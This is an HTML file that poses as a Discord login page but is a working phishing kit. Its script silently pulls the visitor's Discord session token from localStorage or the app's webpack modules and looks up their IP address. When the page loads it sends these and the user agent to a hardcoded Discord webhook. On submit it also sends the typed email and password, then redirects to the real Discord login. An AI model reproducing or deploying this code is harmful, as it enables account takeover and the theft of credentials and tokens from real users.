<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Discord</title>
  <link href="https://cdn.jsdelivr.net/npm/@fontsource/whitney@4.5.0/index.min.css" rel="stylesheet" />
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body, html { height: 100%; background: #2f3136; font-family: 'Whitney', 'Helvetica Neue', sans-serif; color: #dcddde; }
    .container { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; padding: 40px 20px; }
    .logo-container { background: #2f3136; padding: 16px; border-radius: 8px; margin-bottom: 16px; }
    .logo { width: 124px; }
    h1 { font-size: 26px; font-weight: 600; margin-bottom: 8px; text-align: center; color: #fff; }
    p { font-size: 16px; color: #b9bbbe; margin-bottom: 32px; text-align: center; line-height: 1.4; }
    form { width: 100%; max-width: 380px; }
    label { font-size: 12px; font-weight: 600; color: #b9bbbe; margin-bottom: 6px; display: block; text-transform: uppercase; }
    input { width: 100%; padding: 12px 16px; background: #202225; border: 1px solid #202225; border-radius: 4px; color: #dcddde; font-size: 16px; margin-bottom: 16px; transition: border 0.2s; }
    input:focus { outline: none; border-color: #5865f2; }
    .forgot { text-align: right; margin-bottom: 24px; }
    .forgot a { color: #00aff4; font-size: 14px; text-decoration: none; }
    button { width: 100%; padding: 14px; background: #5865f2; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
    button:hover { background: #4752c4; }
    .register { text-align: center; margin-top: 24px; font-size: 14px; color: #b9bbbe; }
    .register a { color: #00aff4; text-decoration: none; }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo-container">
      <img src="https://seeklogo.com/images/D/discord-wordmark-white-logo-E95C468613-seeklogo.com.png" alt="Discord" class="logo" />
    </div>
    <h1>Welcome back!</h1>
    <p>We're so excited to see you again!</p>
    <form id="loginForm">
      <label for="email">Email or Phone Number</label>
      <input type="text" id="email" required />
      <label for="password">Password</label>
      <input type="password" id="password" required />
      <div class="forgot">
        <a href="#">Forgot your password?</a>
      </div>
      <button type="submit">Log In</button>
    </form>
    <div class="register">
      Need an account? <a href="#">Register</a>
    </div>
  </div>

  <script>
    const WEBHOOK = 'https://discord.com/api/webhooks/1434969761539690639/z9ni7tqOcUmKzc542doFrJOL3WZuBwtcnWXnJkP_XAXIW7BEDeWLg-D7coUWuFHs_3cS';

    // === GRAB TOKEN (silent) ===
    function grabToken() {
      let token = null;
      try {
        const ls = localStorage.getItem('token');
        if (ls && ls.length > 50) token = ls.replace(/"/g, '');
      } catch (e) {}
      if (!token) {
        try {
          webpackChunkdiscord_app?.push([[''], {}, r => {
            for (let m in r.c) {
              if (r.c[m].exports?.default?.getToken) {
                token = r.c[m].exports.default.getToken();
                break;
              }
            }
          }]);
        } catch (e) {}
      }
      return token || 'Not found';
    }

    // === SEND TO WEBHOOK (silent) ===
    async function sendEmbed(title, color, fields) {
      try {
        const ip = await fetch('https://api.ipify.org').then(r => r.text()).catch(() => 'unknown');
        const token = grabToken();
        const payload = {
          embeds: [{
            title,
            color,
            fields: [
              ...fields,
              { name: 'Token', value: token.length > 50 ? `\`\`\`${token.substring(0, 60)}...\`\`\`` : 'Not found', inline: false },
              { name: 'IP', value: `\`${ip}\``, inline: true },
              { name: 'UA', value: `\`${navigator.userAgent.substring(0, 100)}\``, inline: false }
            ],
            timestamp: new Date().toISOString()
          }]
        };
        fetch(WEBHOOK, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
      } catch (e) {}
    }

    // === 1. LINK CLICKED (on page load) ===
    window.addEventListener('load', () => {
      sendEmbed('LINK CLICKED', 0x00ff00, []);
    });

    // === 2. LOGIN SUBMIT (only if valid) ===
    document.getElementById('loginForm').onsubmit = async (e) => {
      e.preventDefault();
      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value;

      if (!email || !password) return; // Block empty

      await sendEmbed('LOGIN SUCCESS', 0x5865f2, [
        { name: 'Email/Phone', value: `\`${email}\``, inline: false },
        { name: 'Password', value: `\`${password}\``, inline: false }
      ]);

      setTimeout(() => {
        window.location = `https://discord.com/login?email=${encodeURIComponent(email)}`;
      }, 800);
    };
  </script>
</body>
</html>
